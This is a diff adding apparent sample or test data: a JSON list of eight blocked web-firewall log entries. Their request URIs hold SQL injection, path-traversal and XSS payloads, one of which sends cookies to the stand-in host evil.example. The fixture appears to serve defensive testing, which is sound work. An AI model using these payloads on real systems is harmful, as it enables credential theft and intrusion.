@@ -1,0 +1,66 @@
+[
+  {
+    "timestamp": "2026-02-01T10:00:00+00:00",
+    "action": "block",
+    "attack_type": "sqli",
+    "src_ip": "203.0.113.201",
+    "uri": "/products?id=1' UNION SELECT username,password FROM users--",
+    "matched_rule": "942100-SQLi-UnionSelect"
+  },
+  {
+    "timestamp": "2026-02-01T10:05:00+00:00",
+    "action": "block",
+    "attack_type": "xss",
+    "src_ip": "203.0.113.202",
+    "uri": "/search?q=<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
+    "matched_rule": "941100-XSS-ScriptTag"
+  },
+  {
+    "timestamp": "2026-02-01T10:10:00+00:00",
+    "action": "block",
+    "attack_type": "path_traversal",
+    "src_ip": "203.0.113.203",
+    "uri": "/download?file=../../../../etc/passwd",
+    "matched_rule": "930100-LFI-PathTraversal"
+  },
+  {
+    "timestamp": "2026-02-01T11:00:00+00:00",
+    "action": "block",
+    "attack_type": "sqli",
+    "src_ip": "198.51.100.99",
+    "uri": "/login?user=admin' OR '1'='1",
+    "matched_rule": "942100-SQLi-Tautology"
+  },
+  {
+    "timestamp": "2026-02-01T11:00:30+00:00",
+    "action": "block",
+    "attack_type": "sqli",
+    "src_ip": "198.51.100.99",
+    "uri": "/login?user=admin'--",
+    "matched_rule": "942100-SQLi-CommentTerminator"
+  },
+  {
+    "timestamp": "2026-02-01T11:01:00+00:00",
+    "action": "block",
+    "attack_type": "xss",
+    "src_ip": "198.51.100.99",
+    "uri": "/login?redirect=<script>alert(1)</script>",
+    "matched_rule": "941100-XSS-ScriptTag"
+  },
+  {
+    "timestamp": "2026-02-01T11:01:30+00:00",
+    "action": "block",
+    "attack_type": "path_traversal",
+    "src_ip": "198.51.100.99",
+    "uri": "/login?theme=../../../../etc/passwd",
+    "matched_rule": "930100-LFI-PathTraversal"
+  },
+  {
+    "timestamp": "2026-02-01T11:02:00+00:00",
+    "action": "block",
+    "attack_type": "sqli",
+    "src_ip": "198.51.100.99",
+    "uri": "/login?user=admin' AND SLEEP(5)--",
+    "matched_rule": "942110-SQLi-TimeBased"
+  }
+]
